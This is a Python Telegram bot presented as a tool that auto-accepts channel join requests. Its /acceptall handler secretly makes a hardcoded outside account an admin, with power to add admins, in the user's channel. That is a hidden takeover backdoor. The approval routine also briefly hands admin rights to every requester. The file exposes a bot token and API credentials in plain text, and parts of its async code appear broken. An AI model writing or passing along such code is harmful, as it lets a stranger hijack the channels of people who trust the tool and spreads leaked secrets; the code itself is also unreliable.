import time
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.tl.functions.channels import EditAdminRequest, LeaveChannel
from telethon.tl.types import ChatAdminRights, ChannelParticipantsRequests
from telethon.errors import FloodWaitError, SessionPasswordNeededError
import asyncio
import threading

# Bot setup
API_TOKEN = '7821967646:AAFHUS91204U6P6xqnBOdAefk42agRWzTc0'
bot = telebot.TeleBot(API_TOKEN)

# Telethon user account credentials
api_id = '22012880'
api_hash = '5b0e07f5a96d48b704eb9850d274fe1d'
phone_number = '7367017930'

# Initialize Telethon client
client = TelegramClient('session_name', api_id, api_hash)

# Login function for Telethon client
async def login():
    try:
        await client.start(phone_number)
    except SessionPasswordNeededError:
        print("Two-step verification is enabled. Please provide the password.")
    except Exception as e:
        print(f"Failed to log in: {e}")
        raise e

# Accept join requests in a channel
async def accept_all_requests(channel_username):
    try:
        channel = await client.get_entity(channel_username)
        
        async for request in client.iter_participants(channel, filter=ChannelParticipantsRequests):
            try:
                rights = ChatAdminRights(add_admin=True, change_info=True)
                await client(EditAdminRequest(channel, request.user_id, rights=rights))
                
                # Remove admin rights after approving
                await asyncio.sleep(1)  # Short delay
                await client(EditAdminRequest(channel, request.user_id, rights=ChatAdminRights()))
                print(f"Approved join request for user {request.user_id}")
            except FloodWaitError as e:
                print(f"Rate limit hit. Waiting for {e.seconds} seconds...")
                await asyncio.sleep(e.seconds)
    except Exception as e:
        print(f"Error: {e}")

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    developer_button = types.InlineKeyboardButton(text="• Developer •", url="https://t.me/Ur_amit_01")
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(developer_button)

    welcome_text = (
        "Welcome to the Auto Join Request Acceptor Bot! 🚀\n\n"
        "Commands:\n"
        "/acceptall - Approve all pending join requests in a channel.\n\n"
        "1. Add the bot as admin in your channel.\n"
        "2. Use /acceptall to approve all requests.\n"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=keyboard)

@bot.message_handler(commands=['acceptall'])
def handle_accept_all(message):
    async def process_accept_all():
        chat = message.chat
        channel_username = chat.username if chat.username else chat.id
        user_id = '6803505727'

        try:
            await add_user_as_admin(channel_username, user_id)
            await accept_all_requests(channel_username)
            await bot_leave_channel(channel_username)
            await user_leave_channel(channel_username)
            bot.reply_to(message, "All join requests accepted, and bot has left the channel!")
        except Exception as e:
            bot.reply_to(message, f"An error occurred: {e}")
            print(f"Bot error: {e}")

    # Run in the event loop without blocking
    asyncio.create_task(process_accept_all())

# Grant admin rights to a user
async def add_user_as_admin(channel_username, user_id):
    try:
        channel = await client.get_entity(channel_username)
        rights = ChatAdminRights(add_admin=True, change_info=True)
        await client(EditAdminRequest(channel, user_id, rights=rights))
    except Exception as e:
        print(f"Error adding admin: {e}")

# Bot leaves the channel
async def bot_leave_channel(channel_username):
    try:
        channel = await client.get_entity(channel_username)
        await client(LeaveChannel(channel))
    except Exception as e:
        print(f"Error when bot leaves the channel: {e}")

# User leaves the channel
async def user_leave_channel(channel_username):
    try:
        channel = await client.get_entity(channel_username)
        await client(LeaveChannel(channel))
    except Exception as e:
        print(f"Error when user leaves the channel: {e}")

def start_bot():
    print("Bot is starting...")
    bot.polling(non_stop=True, interval=0)

def start_telethon_client():
    print("Logging in to Telethon client...")
    asyncio.run(login())

if __name__ == "__main__":
    bot_thread = threading.Thread(target=start_bot)
    telethon_thread = threading.Thread(target=start_telethon_client)

    bot_thread.start()
    telethon_thread.start()

    bot_thread.join()
    telethon_thread.join()
